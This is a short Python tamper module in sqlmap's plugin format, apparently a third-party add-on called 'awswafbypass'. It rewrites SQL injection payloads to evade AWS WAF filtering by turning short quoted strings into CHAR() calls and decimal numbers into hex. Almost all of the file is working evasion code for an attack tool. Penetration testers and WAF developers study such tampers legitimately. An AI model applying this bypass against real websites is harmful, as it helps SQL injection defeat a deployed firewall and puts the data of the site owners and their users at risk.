#!/usr/bin/env python
# JeevSQL Tamper: awswafbypass - by Jeevraj
# AWS WAF-specific bypass using hex encoding and CHAR() substitution.
from lib.core.enums import PRIORITY
import re, random

__priority__ = PRIORITY.HIGH

def dependencies(): pass

def _to_char_fn(s):
    return 'CHAR(%s)' % ','.join(str(ord(c)) for c in s)

def tamper(payload, **kwargs):
    if not payload:
        return payload
    result = payload
    # AWS WAF blocks certain string literals; convert them to CHAR() calls
    def replace_string_literal(m):
        inner = m.group(1)
        if len(inner) <= 20:
            return _to_char_fn(inner)
        return m.group(0)
    result = re.sub(r"'([^']{1,20})'", replace_string_literal, result)
    # Use hex notation for numbers
    result = re.sub(r'\b(\d+)\b', lambda m: hex(int(m.group(1))), result)
    return result
